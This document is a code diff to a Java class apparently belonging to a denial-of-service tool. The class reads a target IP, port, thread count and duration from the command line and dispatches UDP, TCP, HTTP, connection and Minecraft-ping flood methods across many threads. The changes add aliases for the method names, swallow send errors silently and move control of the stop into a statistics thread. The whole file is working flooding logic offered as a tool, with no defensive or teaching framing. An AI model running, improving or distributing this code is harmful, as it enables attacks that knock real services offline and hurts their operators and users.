@@ -17,23 +17,23 @@ import java.util.concurrent.TimeUnit;
 @RequiredArgsConstructor
 public class JSSAttack implements Runnable {
     public final CommandLineParser parser;
-    public boolean isDebug;
 
     /**
      * Returns the appropriate attack method based on the provided method, byte size, and attack statics.
-     * @param method the attack method
-     * @param byteSize the size of the attack in bytes
+     *
+     * @param method        the attack method
+     * @param byteSize      the size of the attack in bytes
      * @param attackStatics the attack statics
      * @return the appropriate attack method
      */
     @NotNull
     private static IAttackMethod getMethod(String method, Integer byteSize, AttackStatics attackStatics) {
-        return switch (method) {
-            case "UDPFLOOD" -> new UDPFlood(attackStatics, byteSize);
-            case "TCPFLOOD" -> new TCPFlood(attackStatics, byteSize);
-            case "HTTPFLOOD" -> new HTTPFlood(attackStatics);
-            case "CONNFLOOD" -> new ConnFlood(attackStatics);
-            case "MCPING" -> new MCPingFlood(attackStatics);
+        return switch (method.toUpperCase()) {
+            case "TCPFLOOD", "TCP", "TCP_FLOOD" -> new TCPFlood(attackStatics, byteSize);
+            case "HTTPFLOOD", "HTTP", "HTTP_FLOOD" -> new HTTPFlood(attackStatics);
+            case "CONNFLOOD", "CONN", "CONN_FLOOD" -> new ConnFlood(attackStatics);
+            case "MCPING", "MCPING_FLOOD", "MCPINGFLOOD" -> new MCPingFlood(attackStatics);
+            case "UDPFLOOD", "UDP", "UDP_FLOOD" -> new UDPFlood(attackStatics, byteSize);
             default -> throw new IllegalArgumentException("Invalid method: " + method);
         };
     }
@@ -44,7 +44,7 @@ public class JSSAttack implements Runnable {
     @SneakyThrows
     public void run() {
         // Parse command line arguments
-        this.isDebug = this.parser.get("--debug", Boolean.class, false);
+        final boolean debug = this.parser.get("--debug", Boolean.class, false);
         final String ip = this.parser.get("--ip", String.class, null);
         final Integer port = this.parser.get("--port", Integer.class, -1);
         final Integer ppsLimit = this.parser.get("--pps", Integer.class, -1);
@@ -63,21 +63,21 @@ public class JSSAttack implements Runnable {
         // Set logging level based on verbosity and debug mode
         if (verbose) {
             Logger.setCurrentLevel(Logger.LEVEL.VERBOSE);
-        } else if (this.isDebug) {
+        } else if (debug) {
             Logger.setCurrentLevel(Logger.LEVEL.DEBUG);
         }
 
         // Log debug information if debug mode is enabled
-        if (this.isDebug()) {
-            Logger.setSection("DEBUG");
-            Logger.log(Logger.LEVEL.INFO, "IP is: " + ip);
-            Logger.log(Logger.LEVEL.INFO, "Port is: " + port);
-            Logger.log(Logger.LEVEL.INFO, "MaxThreads is: " + maxThreads);
-            Logger.log(Logger.LEVEL.INFO, "ByteSize is: " + byteSize);
-        }
+        Logger.setSection("DEBUG");
+        Logger.log(Logger.LEVEL.DEBUG, "IP is: " + ip);
+        Logger.log(Logger.LEVEL.DEBUG, "Port is: " + port);
+        Logger.log(Logger.LEVEL.DEBUG, "MaxThreads is: " + maxThreads);
+        Logger.log(Logger.LEVEL.DEBUG, "ByteSize is: " + byteSize);
+        Logger.log(Logger.LEVEL.DEBUG, "Duration is: " + duration);
+        Logger.log(Logger.LEVEL.DEBUG, "Method is: " + method);
 
         // Initialize task manager
-        TaskManager taskManager = new TaskManager(maxThreads);
+        TaskManager taskManager = new TaskManager(maxThreads + 1);
 
         // Initialize attack parameters
         final AttackStatics attackStatics = new AttackStatics(ppsLimit);
@@ -85,38 +85,40 @@ public class JSSAttack implements Runnable {
         final InetAddress addr = InetAddress.getByName(ip);
         final LocalTime endTime = LocalTime.now().plus(Duration.ofSeconds(duration));
 
+        Logger.log(Logger.LEVEL.DEBUG, "addr: " + addr);
+
         // Start the attack and log thread creation
         Logger.setSection("ATTACK");
-        for (int i = 0; i <= maxThreads; i++) {
-            Logger.log(Logger.LEVEL.DEBUG, "Adding new thread. Max: " + maxThreads);
+        for (int i = 1; i <= maxThreads; i++) {
+            Logger.log(Logger.LEVEL.DEBUG, "Adding new thread." + i + " Max: " + maxThreads);
 
             taskManager.add(() -> {
                 do {
                     try {
                         attackMethod.send(addr, port == -1 ? Randomize.randomPort() : port);
-                    } catch (Exception e) {
-                        e.printStackTrace(System.err);
+                    } catch (Exception ignored) {
+
                     }
-                } while (duration == -1 || endTime.isAfter(LocalTime.now()));
+                } while (attackStatics.isRunning());
             });
         }
 
         // Log start of attack
         Logger.log(Logger.LEVEL.INFO, "Attacking...");
 
-        // Add task to print attack statistics if verbose mode is enabled
-        if (verbose) {
-            taskManager.add(() -> {
-                while (LocalTime.now().isBefore(endTime)) {
-                    try {
-                        TimeUnit.SECONDS.sleep(1000);
-                        attackStatics.print();
-                    } catch (InterruptedException e) {
-                        e.printStackTrace(System.err);
-                    }
+        // Add task to manage statics for each second
+        taskManager.add(() -> {
+            while (LocalTime.now().isBefore(endTime) || duration == -1) {
+                try {
+                    TimeUnit.SECONDS.sleep(1);
+                    attackStatics.second();
+                } catch (InterruptedException e) {
+                    e.printStackTrace(System.err);
                 }
-            });
-        }
+            }
+
+            attackStatics.setRunning(false);
+        });
 
         // Perform attack for specified duration or indefinitely
         if (duration == -1) {
